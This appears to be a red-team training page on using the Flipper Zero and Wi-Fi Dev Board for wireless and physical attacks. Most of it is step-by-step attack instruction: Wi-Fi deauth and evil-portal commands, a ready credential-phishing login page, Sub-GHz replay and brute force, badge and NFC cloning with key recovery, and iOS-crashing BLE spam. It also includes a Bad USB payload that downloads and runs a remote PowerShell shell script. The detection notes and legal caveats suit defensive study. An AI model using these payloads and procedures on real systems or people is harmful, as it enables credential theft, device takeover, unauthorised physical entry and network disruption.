---
layout: training-page
title: "Flipper Zero & Wi-Fi Dev Board — Red Team Academy"
module: "Wireless Attacks"
tags:
  - flipper-zero
  - marauder
  - wifi-devboard
  - sub-ghz
  - rfid
  - nfc
  - bad-usb
  - deauth
  - evil-portal
  - ble-spam
  - bluetooth
  - brute-force
  - momentum-firmware
  - gpio
  - uart
  - mfkey32
  - ntag
page_key: "wireless-flipper-zero"
render_with_liquid: false
---

# Flipper Zero & Wi-Fi Dev Board

Flipper Zero is a portable multi-tool for signal research and physical pentesting. It consolidates Sub-GHz RF replay, 125 kHz RFID cloning, NFC emulation, IR replay, iButton, and Bad USB into one pocketable device. With the official Wi-Fi Dev Board (ESP32-S2) and Marauder firmware the platform gains active 802.11 attack capability: deauthentication, evil portals, PMKID capture, and beacon flood.

## Hardware Overview

```
Flipper Zero (base unit)
  Sub-GHz transceiver:  300–928 MHz (CC1101 chip)
  125 kHz RFID reader/emulator (EM4100, HID Prox, Indala, etc.)
  NFC:                  13.56 MHz ISO14443A/B, ISO15693, FeliCa (ST25R3916)
  Infrared:             TX (940 nm LED) + RX; RAW and protocol-based
  iButton (1-Wire):     Dallas DS1990A key cloning
  Bad USB:              USB HID — keyboard / mouse emulation (DuckyScript-like)
  GPIO pins:            8-pin header for dev board attachment
  Storage:              microSD card (FAT32; holds signal captures, payloads, NFC dumps)
  Firmware:             Open source — github.com/flipperdevices/flipperzero-firmware

Wi-Fi Dev Board (official)
  MCU:     ESP32-S2
  802.11:  b/g/n 2.4 GHz only
  Attaches via GPIO header (no soldering required)
  Default firmware: blackmagic debugger
  Attack firmware: Marauder (replaces blackmagic)
```

## Firmware Options

```
Stock firmware — flipperdevices/flipperzero-firmware
  Conservative; Sub-GHz TX limited to local regulations
  No EU/US frequency unlocking
  Safe for legal compliance

Unleashed firmware — DarkFlippers/Unleashed-Firmware
  Removes Sub-GHz frequency restrictions
  Adds extra Sub-GHz protocols (gate openers, older alarm keyfobs)
  Retains stock stability
  Install: flash .dfu or .tgz via qFlipper or web updater

Momentum firmware — Next-Flip/Momentum-Firmware  [successor to Xtreme]
  Spiritual successor to Xtreme firmware (development ceased Nov 2024)
  Bundled BLE Spam, expanded FAP catalog, deep UI customization, asset packs
  More polished than RogueMaster; actively maintained by former Xtreme team
  Site: momentum-fw.dev | Install: place release .zip on SD /update/ → run

RogueMaster firmware — RogueMaster/flipperzero-firmware-wPlugins
  Kitchen-sink build: merges Unleashed + community plugins + animations
  Includes integrated Marauder control, Sub-GHz bruteforcer, BLE Spam
  Largest install — least stable; good for testing community FAPs
  Install: flash via qFlipper or SD /update/ method

Xtreme firmware — Flipper-XFW/Xtreme-Firmware  [ARCHIVED — no longer maintained]
  Development ceased November 2024; superseded by Momentum
  Historical note only — prefer Momentum for equivalent feature set

Recommendation: Unleashed for stable extended RF;
Momentum for curated FAP catalog + BLE Spam attacks;
RogueMaster for maximum community plugin coverage
```

## Wi-Fi Dev Board — Marauder Firmware

```bash
# Install Marauder on the Wi-Fi Dev Board
# Method 1: Web flasher (easiest)
# 1. Attach Dev Board to Flipper GPIO
# 2. Connect Flipper to computer via USB
# 3. Navigate: mango.sesh.ae → "Install Marauder" → follow prompts

# Method 2: esptool
pip install esptool
esptool.py --port /dev/ttyACM0 --baud 921600 write_flash \
  0x0000  bootloader.bin \
  0x8000  partitions.bin \
  0xe000  boot_app0.bin \
  0x10000 esp32s2_marauder_v1.1.0_20240101_flipper.bin

# After flashing: navigate to Flipper GPIO app → Serial → 115200 baud
# Or control directly from Flipper Apps → GPIO → Marauder (RogueMaster firmware)
```

## Marauder — Wi-Fi Attack Commands

Marauder accepts commands over serial (USB or BLE). The Flipper GPIO serial app provides a terminal interface.

```
# Scan for SSIDs
scanap

# Scan for clients (STAs)
scansta

# List scanned results
list -a   (access points)
list -s   (stations/clients)

# Select target AP (index from list)
select -a 0

# Select target client
select -s 0

# Deauthentication attack
# Sends 802.11 deauth frames — boots clients off the AP
deauth -a    # deauth all clients from selected AP
deauth -s    # deauth specific selected station
deauth -c 0  # target AP index 0, all clients
stopscan     # stop any running attack

# Beacon spam — flood area with fake SSIDs
# Confuses Wi-Fi scanners; used for distraction during physical engagements
beacon -a    # spam random SSIDs
beacon -r    # spam SSIDs from a rickroll list (included)
beacon -l    # spam SSIDs from a custom ssids.txt on SD card

# PMKID capture (WPA2 handshake-adjacent)
# Captures PMKID from AP beacon/probe — no client required
# Requires: WPA2 AP that supports PMKID (most modern APs)
pmkid -a     # attempt PMKID capture from selected AP
# Output: PMKID hash saved to SD → transfer to PC for cracking
# Crack: hcxtools converts to hashcat format (-m 22000)

# Probe request sniffing — log what devices are searching for
# Reveals device history and preferred networks
sniffraw
# or
sniffbeacon
# Output logged to SD card as pcap

# Evil Portal — rogue AP with captive portal
# Hosts a fake Wi-Fi login page to capture credentials
evilportal -a "CorpGuest"    # spawn AP with SSID "CorpGuest"
# Victims connect; portal page served from SD card /MARAUDER/portals/
# Default portal: generic login form; customize HTML files on SD card

# Wardrive — GPS-tagged AP survey (requires GPS module on dev board)
wardrive          # scan APs with GPS coordinates
wardrive -s       # scan stations (client devices) instead
stopscan          # stop wardrive
# Output: WigleWifi-1.4 CSV saved to SD card as wardrive_0.csv
# Upload directly to wigle.net for mapping; compatible with hcxtools/airodump-ng

# Packet monitor — live frame counter by type
stopscan
monitor
```

## Evil Portal — Custom Credential Capture Page

```html
<!-- Save as /MARAUDER/portals/index.html on Flipper SD card -->
<!-- Mimics corporate guest Wi-Fi login -->
<!DOCTYPE html>
<html>
<head><title>Guest Network Login</title></head>
<body>
  <h2>Guest Wi-Fi — Please Sign In</h2>
  <form method="POST" action="/login">
    <label>Email: <input type="email" name="email" required></label><br>
    <label>Password: <input type="password" name="password" required></label><br>
    <input type="submit" value="Connect">
  </form>
</body>
</html>
```

```bash
# Marauder logs POST data to SD card at /MARAUDER/logs/
# After engagement: retrieve SD card, read logs/capture.log
# Credentials stored as: timestamp,email,password
```

## Sub-GHz Attacks

The CC1101 transceiver covers 300–928 MHz — the band used by most fixed-code remotes, garage doors, gate openers, and older wireless alarm sensors.

```
Common frequencies and targets:
  315 MHz  — US/Canada garage doors, car key fobs (older fixed-code)
  433.92 MHz — EU garage doors, alarm sensors, remote starts
  868 MHz  — EU IoT devices, alarm systems
  915 MHz  — US ISM band sensors, older key fobs

Attack workflow (fixed-code remotes):
  1. Apps → Sub-GHz → Read RAW
  2. Point Flipper at the target transmitter; press target button
  3. Flipper captures signal burst and saves as .sub file
  4. Apps → Sub-GHz → Saved → select file → Send
  5. Flipper retransmits the exact captured signal

Rolling code (KeeLoq, HiTag2) — replay alone doesn't work
  Modern car fobs and most post-2010 remotes use rolling codes
  Flipper captures but cannot crack rolling codes natively
  Use RollJam technique (separate hardware) for rolling code bypass
  See: wireless/sdr-attacks for RollJam implementation

Sub-GHz protocol analysis:
  Flipper can decode: AM270, AM650, FM238, FM476, CAME, Nice FLO,
  Ansonic, GateTX, Chamberlain KEELOQ, Faac SLH, Princeton, and more
  Unknown protocols: capture RAW → analyze with Universal Radio Hacker

Frequency unlock (Unleashed/RogueMaster):
  Enables TX outside default allowed bands (for lab / authorized use only)
  Settings → Frequency Analyzer → unlock full range
```

## 125 kHz RFID Cloning

```
Supported read/emulate protocols:
  EM4100 / EM4102  — most common proximity cards (blue/white fobs)
  HID Prox (HID 125 kHz) — corporate access cards
  Indala         — older Motorola/HID cards
  IO Prox        — Kantech format
  Paradox        — alarm system badges
  Viking         — elevator key fobs

Read workflow:
  Apps → 125 kHz RFID → Read
  Hold Flipper against the card/fob (within ~3 cm)
  Flipper displays card type + UID when read succeeds
  Save with name (stored as .rfid on SD card)

Emulate (cloned card):
  Apps → 125 kHz RFID → Saved → select → Emulate
  Hold Flipper against reader — reader sees the cloned UID
  Range: ~3–5 cm; same as original card

Write to T5577 blank:
  T5577 is a writable RFID tag (available on AliExpress, ~$0.50/card)
  Apps → 125 kHz RFID → Saved → select → Write to T5577
  Creates a physical cloned card — no Flipper needed for entry
  T5577 writes EM4100, HID Prox, Indala formats

Limitations:
  Cannot read/write iClass (13.56 MHz HID — different radio)
  Cannot read/write DESFire / MIFARE DESFire (encrypted NFC)
  Some corporate readers verify sector data beyond UID — cloning UID alone may not work
```

## NFC Attacks (13.56 MHz)

```
Supported protocols:
  MIFARE Classic 1K / 4K — parking meters, transit cards, hotel keys, locker access
  MIFARE Ultralight      — disposable transit tickets
  MIFARE DESFire (read UID only — data is encrypted/authenticated)
  ISO14443A/B            — generic smartcards
  NFC-A/B/V/F (FeliCa)  — Japan transit cards

MIFARE Classic read workflow:
  Apps → NFC → Read
  Flipper performs dictionary attack with built-in key set (nested auth)
  Cards with default keys (0xFFFFFFFFFFFF, 0xA0A1A2A3A4A5, etc.)
  are usually read fully in <30 seconds
  Saves as .nfc file on SD card containing all sectors

Emulate cloned card:
  NFC → Saved → select → Emulate
  Flipper emulates the card UID and sector data
  Works for parking/gym access that only checks UID
  Cards with MAC validation / server-side checks will fail

MIFARE mfoc attack (advanced — not on Flipper):
  If Flipper's built-in dictionary fails, use a PC:
  # Install: apt install mfoc mfcuk
  # mfoc -O card.mfd    # nested authentication key recovery
  # mfcuk -C -R 0:A:... # darkside attack for completely unknown keys
  # Transfer .mfd back to SD card for Flipper emulation

Hotel key analysis:
  Most hotel systems use MIFARE Classic with proprietary encoding
  Flipper reads and saves the raw dump
  Analyze with: libnfc + mfoc on PC or MIFARE Classic Tool (Android)
  Some systems re-encode on checkout — cloned key may stop working
```

## Bad USB (HID Injection)

Flipper acts as a USB HID keyboard — identical in concept to the USB Rubber Ducky. Payloads are written in a DuckyScript-compatible format.

```
Payload file format (.txt stored in /badusb/ on SD card):

REM Open PowerShell and download reverse shell
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')"
ENTER

Keys supported: ALT, CTRL, SHIFT, GUI, ENTER, DELAY, STRING, REM,
  CAPSLOCK, NUMLOCK, SCROLLLOCK, all F-keys, arrow keys, special chars

Run payload:
  Apps → Bad USB → select payload → Run
  Plug Flipper into target USB port
  Payload executes immediately on connect (or after DELAY)

Limitations vs O.MG Elite:
  No Wi-Fi exfiltration — Flipper Bad USB is fire-and-forget USB only
  No remote triggering without Wi-Fi Dev Board (separate app needed)
  Keystroke injection speed: adequate but slower than RubberDucky V3
  No multi-stage payload downloads without network connectivity

Combining with Wi-Fi Dev Board:
  Stage 1: Bad USB → opens PowerShell, downloads payload from local server
  Stage 2: Marauder evil portal → running on same Flipper, harvests credentials
  Flipper can run Bad USB and Wi-Fi attacks simultaneously
```

## Infrared Replay

```
Flipper includes an IR TX LED and IR RX sensor (NEC, Samsung, Sony, RC5, RC6, RAW)

Universal remotes database:
  Flipper ships with TV/projector/AC IR libraries (~80+ brands)
  Apps → Infrared → Universal Remotes → TV/AC/Projector/etc.
  One-button off/on — useful for physical engagement distractions

Capture custom signals:
  Apps → Infrared → Learn New Remote
  Point target remote at Flipper; press button
  Flipper captures and decodes (or stores as RAW)
  Save → Emulate for replay

Physical attack scenarios:
  Disable conference room AV during a presentation (distraction)
  Unlock server room IR-controlled access panels (rare but exists)
  Disable PIR motion sensors that respond to IR commands (rare)
```

## iButton (Dallas Key)

```
iButton = Dallas/Maxim 1-Wire key (metal contact token, common in Eastern Europe)
Flipper reads: DS1990A, DS1992, DS1996, DS2002, DS2004, CYFral, Metacom, Elfin

Read:
  Apps → iButton → Read
  Touch the metal token to Flipper's iButton port (bottom contact)
  Saves key ID as .ibtn file

Emulate:
  iButton → Saved → select → Emulate
  Touch Flipper's iButton port to the reader — behaves like the original key

Write to writable key:
  Compatible with RW1990 and similar writable tokens
  iButton → Saved → select → Write
```

## Bluetooth LE Spam Attacks

Flipper Zero can flood nearby devices with Bluetooth LE advertisements impersonating pairing requests and action modals. The attack causes popup fatigue, can crash/reboot unpatched iOS devices, and distracts targets during physical engagements. Available via the `BLE Spam` FAP (Willy-JL / Spooks4576 / ECTO-1A), bundled in Momentum and RogueMaster; Apple-only variant `apple_ble_spam_ofw` available for stock firmware.

```
Run path: Apps → Bluetooth → BLE Spam → select attack → Start

Attack variants:
  Apple Action Modal
    Sends "Setup New Device" / "Transfer Number" / "AppleTV Pairing" popups
    Interrupts iOS foreground apps; popup requires manual dismissal
    Range: ~50 m effective

  Apple Device Popup
    Impersonates AirPods, AirTag, BeatsX, AirPods Pro proximity pairing
    Triggers large "Connect" modal on screen; victim must dismiss manually

  iOS 17 Lockup / Crash (LockByte attack)
    Repeated malformed LockByte BLE advertisements
    Can force reboot on unpatched iOS 17.x devices in proximity
    Fixed in iOS 17.2+ — useful for identifying unpatched devices in scope

  Android Device Pair (Google Fast Pair)
    Impersonates Bose NC 700, JBL Live 300TWS, JBL Flip 6, Pixel Buds
    Triggers "New device found" banner on Android
    Range: ~50 m; dismissible but persistent if attack loops

  Windows Device Found (Microsoft Swift Pair)
    Triggers Windows "New Bluetooth device found" toast notification
    Close-range only: <1–2 m for the beacon to register reliably

  Every Method Combined (Kitchen Sink)
    Randomises across all variants above in rapid succession
    Maximum disruption; lowest per-device persistence

Stopping: press Back button to exit BLE Spam app
```

```
Detection:
  iOS devices log Bluetooth advertisement events in syslog (accessible via
  Apple Configurator / Xcode Console) — pattern: repeated BLEAdv frames
  from randomized MACs. Enterprise BLE monitoring (e.g., Cisco DNA Spaces)
  flags rapid BLE peripheral churn as anomalous.
  Windows Bluetooth Event Log (Event ID 7000 series) records pairing attempts.
```

## Sub-GHz Brute Force

For fixed-code remote systems (garage doors, gate openers, older alarm keyfobs) without rolling-code protection, Flipper can iterate the full keyspace. Two tools exist with different workflows.

```
Tool 1 — Sub-GHz Bruteforcer FAP (on-device)
  Available in: Unleashed, Momentum, RogueMaster
  Path: Apps → Sub-GHz → Sub-GHz Bruteforcer
    → select protocol (e.g., CAME, Nice FLO, Ansonic, Princeton)
    → adjust timing: hold Up to increase inter-key delay (default ~10 ms)
    → adjust repeats: press Right on the protocol entry
    → OK to start; Flipper iterates codes sequentially at the target frequency

  Supported fixed-code protocols (selection):
    CAME (12-bit, 433.92 MHz) — very common EU gate openers
    Nice FLO / BFT (12-bit, 433.92 MHz)
    Ansonic (12-bit, 433.92 MHz)
    Princeton (24-bit, 315/433 MHz)
    Chamberlain (9/10-bit, 300–315 MHz) — older US garage doors
    Bosch 12 DIP / 20 DIP — alarm panel remotes
    Tormatic, Marantec, Dickert, Cardin, Rademacher, Hormann
  Rolling-code systems (KeeLoq, Security+ 2.0): NOT brute-forceable — skip

Tool 2 — flipperzero-bruteforce (Python, PC-side)
  Generates split .sub files offline; play them from Flipper Sub-GHz → Saved
  Install:
    git clone https://github.com/tobiabocchi/flipperzero-bruteforce
    cd flipperzero-bruteforce && pip install -r requirements.txt
    python3 brute.py <protocol> <frequency>

  Binary-search workflow (faster than full linear scan):
    1. Generate files:  python3 brute.py CAME_12bit 433920000
    2. Copy output folder to SD:/subghz/
    3. Play the largest file (e.g., split_4096/) — watch for target reaction
    4. Narrow to the half that triggered; play split_2048/ from that range
    5. Descend: split_1024/ → 512/ → 128/ until exact code confirmed
    6. Single .sub file with the matching code can be saved and replayed

Timing estimates (CAME 12-bit = 4096 codes):
  Full linear scan: ~2–5 minutes at default timing
  Binary-search (6 rounds): ~30–90 seconds total
  Princeton 24-bit: hours at full scan — binary-search is essential
```

## GPIO — UART Bridge

Flipper Zero can act as a USB-to-UART adapter using its GPIO header, providing serial console access to embedded devices without a separate FTDI/CP2102 adapter. Built into stock OFW — no custom firmware needed.

```
App path: GPIO → USB-UART Bridge  (main menu, not under Apps)

Default pin assignments (3.3 V logic — do not connect 5 V UART directly):
  Pin 13  → UART TX  (Flipper TX → target device RX)
  Pin 14  → UART RX  (Flipper RX → target device TX)
  Pin 8 / 11 / 18  → GND

  Alternate pins selectable in the bridge UI: Pin 15 (TX) / Pin 16 (RX)
  Wiring rule: always cross TX↔RX between Flipper and target

Supported baud rates:
  300, 600, 1200, 2400, 4800, 9600 (default), 19200, 38400, 57600, 115200, 230400
  Reliable limit: 115200 — rates above this have known data-loss issues
  (firmware issue #2304 — keep to ≤115200 for hardware-hacking work)

Usage workflow:
  1. Wire Flipper GPIO to target UART pads (TX→RX, RX→TX, GND→GND)
  2. Connect Flipper to attack laptop via USB
  3. Flipper: GPIO → USB-UART Bridge → set baud rate → Start
  4. Laptop: screen /dev/ttyACM0 115200  (Linux/macOS)
            or PuTTY → Serial → COMx → 115200 (Windows)
  5. Power on target device — serial console output appears in terminal

Common UART attack scenarios:
  Router / IoT console: root shell on boot (especially if U-Boot drops to shell)
  Embedded Linux: interrupt U-Boot countdown → set bootargs → boot to recovery
  Password bypass: busybox shell via single-user mode kernel param
  Firmware extraction: redirect dd output over serial to laptop

GPIO pins also support SPI and I2C via FAPs (Logic Analyzer FAP sniffs SPI/I2C buses;
useful for capturing firmware or credentials transiting flash chips or sensor buses).
For full UART/JTAG/SPI methodology, see: iot/hardware-hacking
```

## Advanced NFC — MFKey32 and NTAG Emulation

### MFKey32 — On-Device MIFARE Classic Key Recovery

MFKey32 recovers unknown sector keys by replaying authentication nonces collected from a legitimate reader. Built into stock OFW — no PC or `mfoc` required for the cracking step.

```
When to use MFKey32 vs mfoc:
  MFKey32: you have access to the live reader but card dump is partial
           (attacker presents Flipper to the reader, logs nonces)
  mfoc:    you have the physical card with at least one known default key,
           no reader access needed (nested authentication attack on card)

MFKey32 workflow:
  1. NFC → Read card
     If encrypted sectors exist: "Unknown keys — partial dump saved"
     Note which sectors have unknown keys

  2. NFC → Detect Reader  (labeled "Extract MF Keys" on OFW 1.0.0+)
     Present Flipper to the legitimate reader ~5–10 times
     Flipper emulates the target card UID and logs auth nonces from reader

  3. Apps → NFC → MFKey → OK to start cracking
     On-device runtime: seconds to ~30 min (depends on nonce count)
     Recovered keys auto-merge into user dictionary (mf_classic_dict_user.nfc)

  4. NFC → Saved → target card → Read  (retry with enriched dictionary)
     Previously locked sectors now decrypt; save complete dump

  5. NFC → Saved → full dump → Emulate
     Flipper presents as the fully cloned card
```

### NTAG Emulation

```
Supported NTAG types: NTAG210, NTAG212, NTAG213 (180 B), NTAG215 (540 B), NTAG216 (924 B)
NTAG215 is the Amiibo format — 540-byte user memory

Workflow — clone an existing NTAG:
  1. NFC → Read → hold Flipper near NTAG tag
  2. Save dump as .nfc to SD:/nfc/
  3. NFC → Saved → select → Emulate
     Flipper presents the cloned UID + NDEF contents

Workflow — create blank NTAG for write:
  1. NFC → Add Manually → select NTAG type
  2. Emulate the blank tag
  3. Use NFC Tools (Android) to write NDEF payload into the emulated tag
     (URL, WiFi credentials, vCard — useful for proximity phishing)

Practical uses:
  Clone access tags that use NTAG for door entry
  Create poisoned NFC tags for physical phishing (URL → phishing site, WiFi auto-connect)
  Emulate Amiibo figures for testing NFC reader implementations

Limitations:
  Password-protected NTAGs: emulation reproduces PWD state; cracking requires offline tooling
  NFC counter: hardware read counter may not increment correctly across emulation cycles —
    systems using the counter for authentication may detect emulation
  Amiibo emulation on Nintendo Switch: rejected as of Switch firmware ~0.94.1+;
    use real NTAG215 + Tagmo for reliable Amiibo cloning
  UID writability on physical clones: real NTAG UIDs are factory-locked;
    use NFC Magic app + "Magic NTAG" (writable UID) card for physical clone
```

## Flipper App (FAP) Ecosystem

The Flipper Application Package (FAP) system allows community apps to run natively on the device. Key offensive apps beyond built-ins:

```
Discovery: lab.flipper.net/apps  |  flipc.org  |  github.com/djsime1/awesome-flipperzero

Notable FAPs for red team use:

  NFC Magic (AloneLiberty)
    Writes to magic MIFARE cards (Gen1A / Gen2 / Gen4) including sector 0
    Enables cloning UID-locked access cards to a physical card clone
    Path: Apps → NFC → NFC Magic

  BLE Spam (Willy-JL / Spooks4576 / ECTO-1A)
    Cross-platform Bluetooth pairing popup flood (see BLE Spam section)
    Path: Apps → Bluetooth → BLE Spam

  Sub-GHz Bruteforcer (derskythe / xMasterX)
    Fixed-code RF brute force with protocol presets (see Sub-GHz Brute Force)
    Path: Apps → Sub-GHz → Sub-GHz Bruteforcer

  PicoPass / iClass (bettse)
    Reads and emulates HID iClass / PicoPass cards (13.56 MHz)
    Fills the gap left by Flipper's built-in NFC (iClass is not MIFARE)
    Path: Apps → NFC → PicoPass

  FindMy Flipper (airy10 / MrMatter)
    Broadcasts Apple Find My / Samsung SmartTag BLE beacons
    Use cases: persistent location beaconing on target assets, tracker spoofing
    Path: Apps → Bluetooth → FindMy Flipper

  GPS NMEA (ezod)
    Reads NMEA GPS sentences from a UART-connected GPS module
    Pairs with Marauder wardrive for GPS-tagged captures
    Path: Apps → GPIO → GPS NMEA

  Evil Portal (bigbrodude6119 / leedave / Willy-JL)
    Captive portal phishing via Wi-Fi Dev Board (standalone, not Marauder)
    Serves custom HTML from SD:/apps_data/evil_portal/
    Path: Apps → GPIO → Evil Portal

  U2F (built-in / community)
    Emulates a FIDO U2F hardware authenticator
    Physical engagement use: insert Flipper into unlocked workstation,
    use as U2F token to register attacker-controlled credential on target site

  NFC Maker
    Generates NDEF tags (URL, WiFi credential share, vCard, plain text)
    Write to blank NTAG/MIFARE Ultralight for proximity phishing drops

Install method:
  lab.flipper.net/apps → click Install → requires Flipper connected via USB + qFlipper running
  Manual: copy .fap file to SD:/apps/<category>/ and it appears in the menu
```

## Operational Notes

```
Detection surface:
  Sub-GHz replay: RF energy is detectable by spectrum analyzers; brief burst
  Sub-GHz brute force: extended RF burst at fixed frequency — SDRs and RF IDS
    (e.g., HackRF + SpectrumSpy) can fingerprint the sequential code pattern
  Deauth attacks: logged by enterprise Wi-Fi controllers (Cisco, Aruba)
    — shows as repeated deauth frames from a spoofed BSSID in RF logs
  Evil portal: visible as a new SSID in Wi-Fi surveys
  RFID read: passive read is undetectable; emulation logs card event on reader
  Bad USB: Windows Event Log 4688 (process creation), PowerShell event logs
  BLE Spam: enterprise BLE monitoring (Cisco DNA Spaces, Zebra MotionWorks)
    flags rapid MAC churn; iOS/Android generate BT event logs; iOS 17.2+
    and patched Android silently drop malformed advertisements without crashing
  GPIO UART Bridge: appears as USB serial device (VID:PID 0483:5740 STM32)
    — visible in Windows Device Manager and Linux dmesg as /dev/ttyACM0

Engagement use cases:
  Physical access simulation: RFID clone → test door access controls
  Wireless coverage test: beacon flood → demonstrate lack of rogue AP detection
  Credential harvest demo: evil portal → show SSID spoofing risk on guest networks
  IT distraction: deauth attack → drop devices to demonstrate wireless DoS risk
  Keylogger/implant delivery: Bad USB → demonstrate USB policy gaps

Legal / authorized use only:
  Sub-GHz TX outside allocated bands requires spectrum authority license
  Deauth attacks disrupt legitimate traffic — use only in isolated lab or scoped engagement
  RFID cloning of access cards requires explicit written authorization
  Evil portal credential capture requires authorization — collecting credentials without consent is illegal
```

## Resources

- Flipper Zero firmware — `github.com/flipperdevices/flipperzero-firmware`
- Unleashed firmware — `github.com/DarkFlippers/unleashed-firmware`
- Momentum firmware (successor to Xtreme) — `github.com/Next-Flip/Momentum-Firmware`
- RogueMaster firmware — `github.com/RogueMaster/flipperzero-firmware-wPlugins`
- Xtreme firmware (archived) — `github.com/Flipper-XFW/Xtreme-Firmware`
- Marauder firmware — `github.com/justcallmekoko/ESP32Marauder`
- Marauder wiki (CLI commands, wardrive) — `github.com/justcallmekoko/ESP32Marauder/wiki`
- Flipper Bad USB payloads — `github.com/UberGuidoZ/Flipper`
- BLE Spam FAP — `github.com/Willy-JL/Flipper-Zero-Bluetooth-Spam-App` (see Momentum/RogueMaster bundles)
- apple_ble_spam_ofw (stock firmware) — `github.com/noproto/apple_ble_spam_ofw`
- flipperzero-bruteforce (PC-side Sub-GHz generator) — `github.com/tobiabocchi/flipperzero-bruteforce`
- Sub-GHz Bruteforcer FAP — `github.com/DarkFlippers/flipperzero-subbrute`
- FlipperMfkey (MFKey32) — `github.com/noproto/FlipperMfkey`
- NFC Magic FAP — `lab.flipper.net/apps` (search "NFC Magic")
- FindMy Flipper — `github.com/MatthewKuKanich/FindMyFlipper`
- Flipper RFID research — `github.com/RfidResearchGroup/proxmark3` (advanced RFID analysis)
- Awesome Flipper Zero — `github.com/djsime1/awesome-flipperzero`
- Flipper app catalog — `lab.flipper.net/apps`
- Flipper GPIO documentation — `docs.flipper.net/zero/gpio-and-modules`
- Wi-Fi Dev Board web flasher — `mango.sesh.ae`
